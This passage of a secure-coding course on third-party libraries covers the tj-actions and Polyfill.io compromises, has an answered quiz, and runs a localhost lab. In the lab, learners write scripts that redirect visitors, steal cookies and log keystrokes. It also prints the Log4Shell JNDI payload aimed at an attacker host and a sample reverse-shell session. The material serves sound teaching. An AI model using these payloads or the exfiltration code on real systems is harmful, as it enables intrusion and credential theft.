disable-sudo: true\n          egress-policy: audit\n     ...\n      - name: Get changed files\n        id: changed-files\n        uses: tj-actions/changed-files@v35\n     ...\n</code></pre> <p>When this workflow is executed, Harden Runner will recognize malicious behavior from <code>tj-actions/changed-files</code> and flag it as <code>Anomalous</code>.</p> <p></p> <p>We can learn more about the malicious behavior in the insights page and observe how the compromised <code>tj-actions/changed-files</code> downloads and executes a Python script. This will dump any secret credentials it finds.</p> <p></p>"},{"location":"05-Third-Party-Libraries/3-2-Real-Example/#mitigations","title":"Mitigations","text":"<p>To address the attacks done on <code>tj-actions/changed-files</code>, the maintainers removed all traces of the malicious code from their repository. They also fixed their release tags so they point to the correct versions.</p> <p>For the users affected by the attack, secure forks of the action were made available as they waited for an official update. When the update was released, it was recommended that users pin the action to a full length commit SHA, so they are not at risk if the tags are modified by an attacker.</p> <pre><code>jobs:\n  changed_files:\n    runs-on: ubuntu-latest\n      - name: Get changed files\n        id: changed-files\n-        uses: tj-actions/changed-files@v35.7.2\n+        uses: tj-actions/changed-files@9328bab880abf4acc377d77718d28c6ac167f154 # v35.7.2\n      ...\n</code></pre> <p>The real example involving Coinbase and TJ-Actions demonstrates how third-party libraries can introduce vulnerabilities that compromise the application. By staying on top of updates and security patches on the libraries we use, we can protect our applications from similar threats.</p>"},{"location":"05-Third-Party-Libraries/4-1-MCQ-Practice/","title":"Practice","text":""},{"location":"05-Third-Party-Libraries/4-1-MCQ-Practice/#multiple-choice","title":"Multiple Choice","text":"<p>Question 1: Why do developers often rely on third-party libraries in software development?</p> <ul> <li>A. To avoid writing their own code entirely</li> <li>B. To reduce development time and reuse existing code</li> <li>C. To increase security and prevent vulnerabilities</li> <li>D. To maintain better control over project dependencies</li> </ul> <p>Correct Answer: B</p> <p>Question 2: What is the main risk associated with using outdated or abandoned third-party libraries?</p> <ul> <li>A. They consume excessive system resources</li> <li>B. They may become unavailable for installation</li> <li>C. They can contain unpatched vulnerabilities exploitable by attackers</li> <li>D. They require manual updates to integrate into projects</li> </ul> <p>Correct Answer: C</p> <p>Question 3: Which of the following measures helps minimize the risks associated with third-party libraries?</p> <ul> <li>A. Avoiding libraries from popular centralized repositories</li> <li>B. Using libraries without version specifications</li> <li>C. Ensuring all dependencies are installed in bulk</li> <li>D. Regularly checking for updates and security patches</li> </ul> <p>Correct Answer: D</p> <p>Question 4: When managing dependencies for a project, how could using the following version specification in package.json increase the risk of vulnerabilities?</p> <pre><code>\"dependencies\": {\n    \"example-library\": \"*\"\n}\n</code></pre> <ul> <li>A. It limits the project to only using outdated versions of the library.</li> <li>B. It introduces conflicts with other libraries due to incompatible versions.</li> <li>C. It allows the project to install any version, including potentially unpatched or vulnerable ones.</li> <li>D. It prevents the library from being installed successfully.</li> </ul> <p>Correct Answer: C</p> <p>Question 5: Consider the following snippet from a <code>requirements.txt</code> file for a Python project. What is the key issue with its dependency management strategy?</p> <pre><code>example-library&gt;=1.0\nanother-library==2.5.0\n</code></pre> <ul> <li>A. Using <code>&gt;=</code> for version specifications can lead to untested versions being installed.</li> <li>B. Specifying an exact version (e.g., <code>==2.5.0</code>) increases the risk of transitive dependency issues.</li> <li>C. Using <code>&gt;=</code> prevents any updates, even critical security patches, from being applied.</li> <li>D. Specifying exact versions is not allowed in Python's requirements.txt files.</li> </ul> <p>Correct Answer: A</p> <p>Question 6: When analyzing a project's dependencies, you discover the following configuration. What hidden risk is MOST likely associated with the transitive dependencies (i.e., the dependencies of the project's direct dependencies) of this project?</p> <pre><code>&lt;dependency&gt;\n    &lt;groupId&gt;com.example.lib&lt;/groupId&gt;\n    &lt;artifactId&gt;core-library&lt;/artifactId&gt;\n    &lt;version&gt;1.5.0&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre> <ul> <li>A. Transitive dependencies might have vulnerabilities unknown to the primary library.</li> <li>B. Transitive dependencies always introduce performance issues.</li> <li>C. Transitive dependencies do not receive updates unless manually specified.</li> <li>D. Transitive dependencies are automatically vetted by package managers for security.</li> </ul> <p>Correct Answer: A</p> <p>Question 7: Given the following code snippet, what is the main risk introduced by integrating a third-party library without vetting its source and update history?</p> <pre><code>@PatchMapping(\"/update\")\npublic void updateValue(@RequestParam(\"newValue\") String newValue) {\n    library.updateData(newValue);\n}\n</code></pre> <ul> <li>A. The library could introduce performance bottlenecks.</li> <li>B. The library could introduce hidden vulnerabilities, such as handling inputs insecurely.</li> <li>C. The library could fail to scale efficiently with increased usage.</li> <li>D. The library could prevent the code from compiling correctly.</li> </ul> <p>Correct Answer: B</p> <p>Question 8: What change occurred to <code>Polyfill.io</code> that enabled malicious activity?</p> <ul> <li>A. Developers failed to implement API rate limiting</li> <li>B. The polyfills contained deprecated features</li> <li>C. The original author used insecure hashing algorithms for polyfills</li> <li>D. The domain was sold to a company that compromised the service</li> </ul> <p>Correct Answer: D</p> <p>Question 9: How did Pdoc become vulnerable to attacks through <code>Polyfill.io</code>?</p> <ul> <li>A. It relied on <code>Polyfill.io</code> to provide backward compatibility for MathJax</li> <li>B. It included MathJax scripts from an insecure CDN</li> <li>C. It failed to validate user-generated documentation inputs</li> <li>D. It stored documentation in plaintext format</li> </ul> <p>Correct Answer: A</p> <p>Question 10: How did the attacker initially compromise <code>tj-actions/changed-files</code>?</p> <ul> <li>A. By using a compromised Personal Access Token (PAT) tied to a bot account.</li> <li>B. By exploiting a vulnerability in Coinbase's repository.</li> <li>C. By brute-forcing the administrator password for the repository.</li> <li>D. By injecting malicious JavaScript into the GitHub Actions workflow.</li> </ul> <p>Correct Answer: A</p> <p>Question 11: What was the purpose of the malicious run.sh script in the <code>tj-actions/changed-files</code> incident?</p> <ul> <li>A. To redirect users to phishing websites.</li> <li>B. To inject harmful code into production builds.</li> <li>C. To dump CI/CD secret credentials into GitHub Action log files.</li> <li>D. To enable unauthorized cloning of the repository.</li> </ul> <p>Correct Answer: C</p>"},{"location":"05-Third-Party-Libraries/4-2-Lab-Practice/","title":"Practice","text":"<p>This exercise puts you in a scenario similar to the real example found in <code>Polyfill.io</code>, where attackers exploited a widely used package to inject malicious code into applications. Here, you will focus on simulating the potential impact and explore different types of attacks. This practice highlights the risks and consequences of relying on third-party scripts.</p>"},{"location":"05-Third-Party-Libraries/4-2-Lab-Practice/#environment-setup","title":"Environment Setup","text":"<p>For this exercise, we will use Python to create a server for our API. The server will simulate the behavior of a compromised third-party script by serving JavaScript code to a vulnerable application. Before we start, we will create a virtual environment to isolate the dependencies we need for this exercise.</p> <p>Virtual Environment: A Python virtual environment is a self-contained directory that isolates different Python dependencies, allowing you to manage different versions of libraries for each project without conflicts.</p> <pre><code># Create a virtual environment\npython -m venv .venv\n\n# Then activate the virtual environment\n\n# On Windows\n.venv\\Scripts\\activate\n\n# On Unix or MacOS\nsource .venv/bin/activate\n</code></pre> <p>Install Requirements: This exercise uses external libraries and frameworks for the server and API. The main dependency we will need is FastAPI, a modern Python framework for creating APIs. FastAPI will be used to create a server that simulates the behavior of a compromised third-party script.</p> <pre><code># Install FastAPI\npython -m pip install \"fastapi[standard]\"\n</code></pre>"},{"location":"05-Third-Party-Libraries/4-2-Lab-Practice/#the-vulnerable-program","title":"The Vulnerable Program","text":"<p>The vulnerable program used in this exercise is called <code>index.html</code>. This program links an external script from the server <code>http://localhost:8000</code>, and you will explore how to send malicious code to exploit the application.</p> <pre><code>&lt;!-- Save this as index.html --&gt;\n\n&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n    &lt;!-- Demonstrates the risks of relying on third-party scripts --&gt;\n    &lt;script src=\"http://localhost:8000\"&gt;&lt;/script&gt;\n    &lt;title&gt;Document&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;h1&gt;Hello World!&lt;/h1&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"05-Third-Party-Libraries/4-2-Lab-Practice/#the-exploit-program","title":"The Exploit Program","text":"<p>The exploit program used in this exercise is called <code>server.py</code>. This program sets up a server using FastAPI, which will serve JavaScript code to the vulnerable application. By simulating a malicious third-party script, this program demonstrates how attackers can exploit external dependencies.</p> <pre><code># Save this as server.py\n\nfrom fastapi import FastAPI, Request, Response\nfrom fastapi.middleware.cors import CORSMiddleware\n\napp = FastAPI()\n\napp.add_middleware(\n    CORSMiddleware,\n    allow_origins=[\"*\"],  # Allow all origins; for stricter rules, specify origins\n    allow_methods=[\"*\"],  # Allow all HTTP methods\n    allow_headers=[\"*\"],  # Allow all headers\n)\n\n\n# Serves JavaScript to the vulnerable program\n@app.get(\"/\")\nasync def root():\n    # Prepare the JavaScript code\n    javascript_code = \"\"\"\\\n    \"\"\"\n    return Response(content=javascript_code, media_type=\"application/javascript\")\n</code></pre>"},{"location":"05-Third-Party-Libraries/4-2-Lab-Practice/#common-commands","title":"Common Commands","text":"<p>In the following, we list some common commands for this exercise.</p> <pre><code># Start the server for the API\nfastapi dev /path/to/server.py\n\n# To stop the server press CTRL+C to quit\n</code></pre>"},{"location":"05-Third-Party-Libraries/4-2-Lab-Practice/#task-1-redirect-the-client","title":"Task 1: Redirect the Client","text":"<p>In this task, we will simulate how an attacker might use malicious code to manipulate the vulnerable program. Your goal is to modify the variable <code>javascript_code</code> to redirect users to another website when the script is loaded. To do this, you can use the <code>window.location</code> object in JavaScript.</p> <pre><code>window.location.href = 'https://www.example.com';\n</code></pre> <p>When you update <code>javascript_code</code>, start the exploit program and open the vulnerable program in a browser to observe how the malicious script affects the application. If it works, the client will see a different website.</p> <pre><code># Example JavaScript code\njavascript_code = \"\"\"\\\nfunction example() {\n    console.log(\"Hello Exploit!\");\n}\n\n// Call the function\nexample()\n\"\"\"\n</code></pre>"},{"location":"05-Third-Party-Libraries/4-2-Lab-Practice/#task-2-steal-the-clients-cookies","title":"Task 2: Steal the Client's Cookies","text":"<p>In this task, we will simulate how an attacker might steal cookies from the vulnerable program. Cookies often store sensitive information which attackers can use to impersonate users or to gain unauthorized access. To simulate this attack, first update the vulnerable program to include cookies.</p> <pre><code>&lt;head&gt;\n    ...\n    &lt;!-- Simulates cookies with fake credentials --&gt;\n    &lt;script&gt;\n        document.cookie = \"sessionID=abc123fakeSessionID; path=/\";\n        document.cookie = \"userToken=xyz789demoToken; path=/\";\n    &lt;/script&gt;\n    ...\n&lt;/head&gt;\n</code></pre> <p>Next, update the exploit program by adding a new endpoint that receives and logs the client's cookies. After making these changes, restart the server.</p> <pre><code># Endpoint to receive the client's cookies\n@app.post(\"/post-cookies\")\nasync def log_cookies(request: Request):\n    client = request.client\n    body = await request.json()\n    print(f\"{client=} {body=}\")\n    return {\"message\": \"Cookie data received\"}\n</code></pre> <p>With these changes, your goal is to modify the variable <code>javascript_code</code> to include malicious code that can steal the cookies from the client. To do this, you will need to include code to send a POST request to the server.</p> <pre><code>async function example() {\n    const cookies = ...; // Retrieve the cookies\n    const data = ...; // Include the cookies\n    try {\n        const response = await fetch(\"http://localhost:8000/post-cookies\", {\n            method: \"POST\",\n            headers: {\n                \"Content-Type\": \"application/json\",\n            },\n            body: JSON.stringify(data), // Send the data\n        });\n        console.log(`Server response: ${response.status}`);\n    } catch (error) {\n        console.error(`Error sending cookies: ${error}`);\n    }\n}\n</code></pre> <p>When you update <code>javascript_code</code>, start the exploit program and open the vulnerable program in a browser to observe how the malicious script affects the application. If it works, the server will log the client's cookies.</p>"},{"location":"05-Third-Party-Libraries/4-2-Lab-Practice/#task-3-log-the-clients-key-presses","title":"Task 3: Log the Client's Key Presses","text":"<p>In this task, we will simulate how an attacker might capture key presses from the vulnerable program. This is known as keylogging and is often used to record sensitive information entered by users, like passwords. To simulate this attack, first update the exploit program by adding a new endpoint.</p> <pre><code># Endpoint to receive the client's key presses\n@app.post(\"/post-keys\")\nasync def log_keys(request: Request):\n    client = request.client\n    body = await request.json()\n    print(f\"{client=} {body=}\")\n    return {\"message\": \"Key data received\"}\n</code></pre> <p>With these changes, your goal is to modify the variable <code>javascript_code</code> to include malicious code that can listen for and send key presses made by the client. To do this, you will need to listen for key presses to then send.</p> <pre><code>document.addEventListener(\"keydown\", async (event) =&gt; {\n    // Prepare the key press data\n    const keyPressed = { key: event.key };\n\n    // Send the key press data to the server\n    ...\n});\n</code></pre> <p>When you update <code>javascript_code</code>, start the exploit program and open the vulnerable program in a browser to observe how the malicious script affects the application. If it works, the server will log the client's key presses.</p>"},{"location":"05-Third-Party-Libraries/Merged/","title":"Introduction to third party libraries","text":"<p>In software development, you will quickly find how often we rely on third-party libraries and frameworks to build products. These dependencies can significantly reduce the time we need, however, while we benefit from reusing code, we are not always aware of the vulnerabilities they might have.</p> <p>When you work on a project, we should not only be concerned about the time it takes to build it, but also how we can make it secure and reliable. In a competitive market, when there are security issues in your product, this can negatively affect customer expectations and result in serious financial losses.</p> <p>For example, in 2021, a critical security vulnerability known as Log4Shell was discovered in the Apache Log4j logging library. This library was used in various consumer and enterprise services, websites, and applications. So, when people found out that attackers can execute remote code on affected systems, there was a costly move to patch and mitigate the threat.</p>"},{"location":"05-Third-Party-Libraries/Merged/#third-party-libraries","title":"Third-Party Libraries","text":"<p>Developers use third-party libraries because they are easy to install and integrate. With package managers like <code>npm</code>, <code>pip</code>, or <code>maven</code>, it is easy for you to search and install dependencies from centralized repositories.</p> <pre><code># Install a specific package from PyPI using pip\npython -m pip install &lt;some-project&gt;\n</code></pre> <p>When you install a package, you will typically specify the name and version. Many times, if you are joining a project, these packages or dependencies will be listed in a file like <code>package.json</code>, <code>requirements.txt</code>, or <code>pom.xml</code>.</p> <pre><code># Install all dependencies listed in requirements.txt\npython -m pip install -r requirements.txt\n</code></pre> <p>However, third-party libraries can have vulnerabilities like any other code, that attackers can exploit to attack your program. If these are not regularly updated or fixed, this becomes a problem for you as a user of the library.</p> <p>In the worst case, dependencies you might use can be abandoned. This means there could be a lack of updates and bug fixes, and oftentimes, you might need to find alternatives or maintain the dependency yourself.</p>"},{"location":"05-Third-Party-Libraries/Merged/#handle-third-party-libraries","title":"Handle Third-Party Libraries","text":"<p>To prevent vulnerabilities from third-party libraries, we need to manage them effectively. We should start by carefully selecting what dependencies we plan to integrate. For example, choose libraries from reputable sources with active communities and regular updates.</p> <p>After you install third-party libraries, it is important that you regularly check for updates and security patches. The sooner you can apply bug fixes the less chance attackers can exploit the dependency in your program.</p> <p>If you find that a library is no longer receiving updates or support, consider replacing it with an actively maintained alternative. In some cases, you might need to fork the library and maintain it yourself, but this should be a last resort because maintenance can become another challenge.</p>"},{"location":"05-Third-Party-Libraries/Merged/#real-world-example","title":"Real-World Example","text":"<p>Let's revisit the Log4Shell security incident to better understand how a third-party library could be exploited and put your program at risk of an attack.</p> <p>To review, this was a vulnerability in the widely used Apache Log4j logging library. This vulnerability allowed attackers to execute remote code by including malicious code in places the logging library could have been used.</p> <p>For example, let's say we installed the dependency for a Java project. To do this, we used maven and specified the vulnerable version at the time.</p> <pre><code>&lt;!-- install vulnerable log4j --&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n    &lt;artifactId&gt;spring-boot-starter-log4j2&lt;/artifactId&gt;\n    &lt;version&gt;2.6.1&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre> <p>This project was a simple API that processed messages received from users. Instead of creating our own logging solution, we used Log4j because it was the standard with many options to customize for our project.</p> <pre><code>@PostMapping(\"/process-message\")\npublic String processMessage(@RequestParam(\"message\") String message, Model model) {\n    // process the received message (e.g., log it)\n    logger.info(\"Received message: \" + message);\n\n    // add the message to the model (for displaying on a result page)\n    model.addAttribute(\"receivedMessage\", message);\n\n    // thymeleaf template name for displaying the result\n    return \"result\";\n}\n</code></pre> <p>However, it was discovered that attackers can exploit programs using this library by including malicious code as input to the logging function. This was possible because Log4j included many options for special use cases that treated special characters as instructions instead of normal data to log.</p> <p>For example, an exploit called Log4Shell used the following input:</p> <pre><code>${jndi:ldap://attackerserver.com:1389/ExploitPayload}\n</code></pre> <p>If this input was passed into our API endpoint, then it was possible for attackers to execute any code they wanted. As the exploit is called Log4Shell, the most common goal was to get a reverse shell. This meant attackers could have taken control of the server to perform any action.</p> <pre><code># Reverse shell established\nNetcat: Connection from &lt;ip_address&gt;\n\n# Command to print the current working directory\n$ pwd\n&gt; /home/ec2-user/victim\n\n# Command to print the current user\n$ whoami\n&gt; root\n</code></pre> <p>This was a real threat when the Log4j vulnerability was discovered. For example, you might be familiar with the video game Minecraft. At that time, attackers could have joined multiplayer servers and executed programs on the computer of any player, including the hosting server, who was there.</p> <p>To fix this vulnerability, the maintainers of Log4j quickly released hot patches to reduce the impact of attacks. Developers who depended on Log4j took steps to update their version. However, people realized that even if they did not directly use Log4j, they might have dependencies that did.</p>"}]}